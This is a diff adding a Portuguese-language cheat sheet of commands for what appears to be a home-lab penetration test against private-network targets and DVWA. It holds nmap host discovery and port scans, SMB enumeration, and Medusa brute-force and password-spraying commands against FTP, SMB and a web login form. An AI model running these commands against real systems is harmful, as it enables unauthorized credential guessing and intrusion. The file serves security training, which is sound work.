@@ -1,0 +1,41 @@
+# Comandos usados / copy-paste (adapte IPs e caminhos)
+
+# Atualizar e instalar ferramentas (Kali)
+sudo apt update && sudo apt upgrade -y
+sudo apt install medusa nmap netcat smbclient enum4linux hydra -y
+
+# Teste de conectividade
+ping 192.168.56.102
+
+# Descoberta de hosts
+nmap -sn 192.168.56.0/24
+
+# Varredura completa de portas e detecção
+nmap -sS -sV -A -p- 192.168.56.102 -oN nmap_full.txt
+
+# Enumeração SMB / NetBIOS
+enum4linux -a 192.168.56.102
+nbtscan 192.168.56.102
+smbclient -L \\192.168.56.102
+
+# Medusa - FTP (usuário conhecido, wordlist de senhas)
+medusa -h 192.168.56.102 -u ftpuser -P wordlists/pass.txt -M ftp > medusa_ftp_output.txt 2>&1
+
+# Medusa - FTP (lista de usuários x lista de senhas)
+medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/pass.txt -M ftp
+
+# Medusa - SMB password spraying (exemplo)
+medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/pass.txt -M smbnt
+
+# Medusa - formulário web (http_form) - exemplo genérico (ajustar campos e URL)
+# medusa -h 192.168.56.103 -u admin -P wordlists/pass.txt -M http_form -m FORM:POST:/dvwa/login.php:/username=^USER^&password=^PASS^&Login=Login
+
+# Alternativa (Burp Suite + Intruder) para formulários com CSRF/tokens:
+# 1) Capture requisição de login em Burp Proxy
+# 2) Envie para Intruder e configure payload positions
+# 3) Use payload list (wordlist)
+
+# Observações
+# - Teste primeiro com wordlists pequenas para validar o fluxo.
+# - Monitore logs no alvo: /var/log/auth.log ou logs do serviço alvo.
+# - Ajuste módulos Medusa conforme versão (use `medusa -h` ou `man medusa`).
